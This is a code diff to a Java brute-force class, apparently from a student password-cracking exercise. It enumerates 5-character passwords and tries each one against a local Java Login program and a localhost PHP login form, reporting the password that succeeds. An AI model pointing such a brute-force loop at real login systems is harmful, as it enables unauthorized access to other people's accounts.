@@ -7,6 +7,8 @@ import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.net.http.HttpResponse.BodyHandlers;
 import utils.HttpUtils;
+import utils.PasswordUtils;
+import java.util.Arrays;
 
 public class AttaqueBruteForce extends Attaque {
 
@@ -15,19 +17,23 @@ public class AttaqueBruteForce extends Attaque {
         switch (cible) {
             case "local":
                 try {
-                    String password;
-                    while (true) {
-                        password = generateNextPassword();
-                        String[] command = {"java", "Login", login, password};
+                    String characters =  PasswordUtils.generateCharacters(true, false, false, false);
+                    String[] passwordList = PasswordUtils.generatePasswordCombinations(characters, 5);
+
+                    for (int i = 0; i < passwordList.length; i++) {
+                        String password = passwordList[i];
+
+                        String[] command = {"java", "-cp", "C:\\Users\\Abdoulaye\\Desktop\\dp\\passwdcracker\\out", "Login", login, password};
                         Process process = new ProcessBuilder(command).start();
                         BufferedReader resultat = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                        String line;
-                        while ((line = resultat.readLine()) != null) {
-                            System.out.println(line);
-                        }
+                        String output = resultat.readLine();
+                        System.out.println("Tentative avec mot de passe: " + password + " -> " + output);
+                        
                         int exitCode = process.waitFor();
-                        if (exitCode == 1) {
+                        if (exitCode == 0) {
+                            System.out.println("=================================");
                             System.out.println("Mot de passe trouve: " + password);
+                            System.out.println("=================================");
                             break;
                         }
                     }
@@ -40,17 +46,21 @@ public class AttaqueBruteForce extends Attaque {
                 String uri = "http://localhost/app/login.php";
                 HttpClient client = HttpUtils.createHttpClient();
                 try {
-                    String password;
-                    while (true) {
-                        password = generateNextPassword();
+                     String characters = PasswordUtils.generateCharacters(true, false, false, false);
+                    String[] passwordList = PasswordUtils.generatePasswordCombinations(characters, 5);
+
+                    for (int i = 0; i < passwordList.length; i++) {
+                        String password = passwordList[i];
                         HttpRequest request = HttpUtils.createPostRequest(uri, login, password);
                         HttpResponse<String> response = client.send(request, BodyHandlers.ofString());
 
-                        System.out.print("Mot de passe: " + password);
+                        System.out.print("Tentative avec mot de passe: " + password + " -> ");
                         System.out.println("Statut: " + response.statusCode());
 
                         if (response.statusCode() == 200) {
+                            System.out.println("=================================");
                             System.out.println("Mot de passe trouve: " + password);
+                            System.out.println("=================================");
                             break;
                         }
                     }
